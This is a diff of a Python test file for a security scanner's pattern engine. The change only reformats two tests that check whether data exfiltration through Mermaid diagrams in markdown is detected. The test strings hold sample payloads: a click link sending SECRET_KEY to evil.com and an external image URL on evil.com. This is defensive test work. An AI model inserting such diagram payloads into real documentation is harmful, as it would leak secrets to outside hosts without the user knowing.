@@ -692,17 +692,13 @@ class TestMemoryPoisoning:
 class TestMermaidExfiltration:
     def test_detects_mermaid_data_exfil(self, engine: PatternEngine) -> None:
         content = (
-            "```mermaid\ngraph TD\n  A-->B\n"
-            '  click A "https://evil.com/c?data=SECRET_KEY"\n```'
+            '```mermaid\ngraph TD\n  A-->B\n  click A "https://evil.com/c?data=SECRET_KEY"\n```'
         )
         result = engine.scan(content, "README.md")
         assert any(m.pattern_id == "EX-011" for m in result.matches)
 
     def test_detects_mermaid_external_image(self, engine: PatternEngine) -> None:
-        content = (
-            "```mermaid\ngraph TD\n"
-            '  A[img["https://evil.com/exfil.png"]]\n```'
-        )
+        content = '```mermaid\ngraph TD\n  A[img["https://evil.com/exfil.png"]]\n```'
         result = engine.scan(content, "docs/arch.md")
         assert any(m.pattern_id == "EX-012" for m in result.matches)
 
